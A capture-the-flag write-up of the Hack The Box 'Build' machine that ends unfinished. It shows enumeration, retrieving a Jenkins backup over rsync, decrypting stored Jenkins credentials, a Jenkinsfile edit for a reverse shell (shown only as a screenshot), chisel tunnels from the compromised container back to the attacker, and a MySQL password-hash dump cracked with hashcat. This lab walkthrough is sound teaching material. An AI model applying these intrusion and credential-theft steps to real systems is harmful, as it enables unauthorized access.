| **Machine**             | \[Build]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Medium                                                                                                                           |
| **Key Concepts**        | Rsync Enumeration, Jenkins Credential Decryption, Gitea, Reverse Shell, Chisel Pivoting, MySQL Credential Extraction, Privilege Escalation|

# Enumeration
Starting Nmap, we discover

```bash
└─$ sudo nmap -sCV 10.129.234.169 -p- --min-rate=1000 -oN nmap_long
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-08 05:36 EDT
Verbosity Increased to 1.                                                                                                              
Completed NSE at 05:37, 8.48s elapsed
Initiating NSE at 05:37                  
Completed NSE at 05:37, 0.09s elapsed
Initiating NSE at 05:37
Completed NSE at 05:37, 0.00s elapsed                                                                                                  
Nmap scan report for 10.129.234.169                                                                                                    
Host is up (0.033s latency).                                                                                                           
Not shown: 65223 closed tcp ports (reset), 305 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION                                                                                                         
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
|_  256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)                                                                      
53/tcp   open  domain  PowerDNS
| dns-nsid:
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open  exec    netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell   Netkit rshd
873/tcp  open  rsync   (protocol version 31)
3000/tcp open  http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform    
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=591c32d6233a6cb3; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=59Lj9_OcXtH7aNbky2CmFc7xmQg6MTc1NDczMjM1NzEyMDI0MTA3OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN                      
|     Date: Sat, 09 Aug 2025 09:39:17 GMT
|     <!DOCTYPE html>     
|     <html lang="en-US" class="theme-auto">
|     <head>                         
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAw
L2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
|   HTTPOptions:                     
|     HTTP/1.0 405 Method Not Allowed                                       
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=215750d87dcd1121; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=SY4GhhLa1IR7M3r6LbK70qF6bsc6MTc1NDczMjM1NzM1NTcxNTI1OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax          
|     X-Frame-Options: SAMEORIGIN    
|     Date: Sat, 09 Aug 2025 09:39:17 GMT
|_    Content-Length: 0              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                  
SF-Port3000-TCP:V=7.95%I=7%D=8/8%Time=6895C53B%P=x86_64-pc-linux-gnu%r(Gen                                                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We find several interesting services:

    512/tcp – rexecd

    513/tcp – login?

    514/tcp – rsh (Remote Shell)

    873/tcp – rsync

    3000/tcp – HTTP (Gitea)

  >RSH (Remote Shell) is an old Unix service that allows running shell commands on a remote machine without an interactive login — and without encryption.
  > Gitea is a self-hosted Git service, basically a lightweight alternative to GitHub or GitLab.

Visiting port 3000, there’s only one repository: dev. It contains a single Jenkins pipeline script which doesn’t seem to actually do anything — probably just for testing.
<img width="2289" height="744" alt="2025-08-08 114211" src="https://github.com/user-attachments/assets/1a8282f4-2581-43c7-a31a-ee3cf417f699" />

I also noticed the hostname on the Gitea page and added it to /etc/hosts.
<img width="753" height="987" alt="2025-08-08 115029" src="https://github.com/user-attachments/assets/63a880b7-6d8e-435c-9128-c5a3349c7816" />

Since there’s nothing more to do here for now, I moved on to rsync.
## Rsync Enumeration
Listing rsync shares
```bash
└─$ rsync 10.129.234.169::
backups         backups
```
Inside backups we find a large jenkins.tar.gz:
```bash
└─$ rsync 10.129.234.169::backups
drwxr-xr-x          4,096 2024/05/02 09:26:31 .
-rw-r--r--    376,289,280 2024/05/02 09:26:19 jenkins.tar.gz
```
Downloaded with -av flag:
```bash
rsync -av --progress 10.129.234.169::backups/jenkins.tar.gz .
```
Extracting the backup, we get a full Jenkins home directory. Interesting finds:

jobs/.../config.xml - {AQAA...} encrypted credentials for buildadm (Gitea user)
users/admin/config.xml - bcrypt hash of Jenkins admin password
secrets/master.key + secrets/hudson.util.Secret - Jenkins encryption keys

Jenkins executes any Groovy scripts placed in $JENKINS_HOME/init.groovy.d/ before startup.
I created a Groovy script to decrypt the {AQAA...} value

```bash
`println hudson.util.Secret.decrypt("{AQAA...}")`
```
Then ran Jenkins in local mode:
```bash
`JENKINS_HOME="$PWD" java -jar jenkins.war --httpPort=-1`
```
The script printed the plaintext Gitea password.

These creds worked for buildadm on the Gitea, giving repo access.
<img width="2139" height="339" alt="2025-08-08 123734" src="https://github.com/user-attachments/assets/e083642d-8426-4210-a33c-38f354ee2197" />

After logging in, I edited the Jenkinsfile in the repo to get a reverse shell.
<img width="2109" height="795" alt="2025-08-08 125342" src="https://github.com/user-attachments/assets/02b5064c-d610-428b-b026-23bb8ad48549" />

Once the build executed, I got a shell inside a container. Inside /root I grabbed the user flag.
<img width="1151" height="237" alt="2025-08-08 125716" src="https://github.com/user-attachments/assets/a2c230f6-16bd-4757-88ba-746d39689cdc" />

# Privilege Escalation
In /root there’s a .rhosts file:
```bash
root@5ac6c7d6fb8e:~# cat .rhosts 
admin.build.vl +
intern.build.vl +
```
This means rlogin from those hostnames as root works without a password.

From /etc/hosts I found the containers internal network info. Running Nmap from inside revealed another host (172.18.0.5) with port 8081 open.
```bash
root@5ac6c7d6fb8e:~# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.18.0.3      5ac6c7d6fb8e
root@5ac6c7d6fb8e:~# 

```
### Pivoting with chisel
To access it, I transferred chisel to the container and set up a reverse port forward:

```bash

root@5ac6c7d6fb8e:~# ./chisel client 10.10.14.60:8000 R:127.0.0.1:8081:172.18.>
2025/08/09 12:04:40 client: Connecting to ws://10.10.14.60:8000
2025/08/09 12:04:41 client: Connected (Latency 54.449317ms)

```
Port 8081 required credentials.
<img width="945" height="560" alt="2025-08-08 140330" src="https://github.com/user-attachments/assets/3362fb02-8c17-49e6-affe-2f4b722d224a" />

From earlier scanning, I also saw MySQL running on 172.18.0.4. I updated the chisel tunnel to access it too.
```bash
root@5ac6c7d6fb8e:~# ./chisel client 10.10.14.60:8000 \
>   R:127.0.0.1:3306:172.18.0.4:3306 \
>   R:127.0.0.1:8081:172.18.0.5:8081
2025/08/09 12:12:10 client: Connecting to ws://10.10.14.60:8000
2025/08/09 12:12:11 client: Connected (Latency 31.582551ms)

```
After creating a proxy we can connect to MySql locally.
```bash
└─$ mysql -h 127.0.0.1 -P 3306 -u root -p

Enter password: 
WARNING: option --ssl-verify-server-cert is disabled, because of an insecure passwordless login.
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 53
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```
Inside the powerdnsadmin database, the user table contained an admin bcrypt hash

```mysql
MariaDB [powerdnsadmin]> select * from user;
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
| id | username | password                                                     | firstname | lastname | email          | otp_secret | role_id | confirmed |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
|  1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | admin     | admin    | admin@build.vl | NULL       |       1 |         0 |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+

```
After cracking it with hashcat, I logged into the port 8081 interface as admin.
<img width="1275" height="1277" alt="2025-08-08 141348" src="https://github.com/user-attachments/assets/1de18d18-9323-443e-9d80-a6303c618055" />

To be continued…


